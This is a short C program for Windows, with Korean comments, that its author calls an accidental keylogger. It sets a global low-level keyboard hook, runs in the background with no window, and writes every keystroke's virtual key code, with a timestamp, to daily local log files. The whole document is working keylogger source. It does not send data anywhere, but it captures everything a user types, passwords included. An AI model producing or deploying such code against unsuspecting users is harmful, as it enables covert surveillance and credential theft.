// 어쩌다보니 키로깅 프로그램을 만들어버렸따....
#include <windows.h>
#include <stdio.h>
#include <time.h>

HHOOK hHook;
char currentDate[11] = {0}; // "YYYY-MM-DD"
FILE *logFile = NULL;

// 날짜별로 로그 파일을 새로 생성
void updateLogFile()
{
    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    char newDate[11];
    snprintf(newDate, sizeof(newDate), "%04d-%02d-%02d",
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday);

    // 날짜가 바뀌었으면 새 파일로 전환
    if (strcmp(currentDate, newDate) != 0)
    {
        if (logFile != NULL)
            fclose(logFile);
        strcpy(currentDate, newDate);

        char filePath[MAX_PATH];
        snprintf(filePath, sizeof(filePath), "logs\\%s.txt", currentDate);
        logFile = fopen(filePath, "a+");
    }
}

// 키보드 후킹 함수
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;

        updateLogFile();

        // 시간 기록
        time_t now = time(NULL);
        struct tm *t = localtime(&now);

        // 로그 기록
        if (logFile != NULL)
        {
            fprintf(logFile, "[%02d:%02d:%02d] KeyCode: %lu\n",
                    t->tm_hour, t->tm_min, t->tm_sec, (unsigned long)p->vkCode);
            fflush(logFile);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// 프로그램 시작점(백그라운드에서 실행)
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShowCmd)
{
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    snprintf(currentDate, sizeof(currentDate), "%04d-%02d-%02d", t->tm_year + 1900, t->tm_mon + 1, t->tm_mday);

    // 로그 디렉토리 생성(일단 프로젝트에 logs 폴더가 있다고 가정)
    CreateDirectoryA("logs", NULL);
    char filePath[MAX_PATH];
    snprintf(filePath, sizeof(filePath), "logs\\[%s]keylog.txt", currentDate);
    logFile = fopen(filePath, "a+");
    if (logFile == NULL)
    {
        return -1;
    }

    // 후킹
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL)
    {
        fclose(logFile);
        return -1;
    }

    // 메시지 루프 (종료될 때까지 대기)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    fclose(logFile);
    return 0;
}
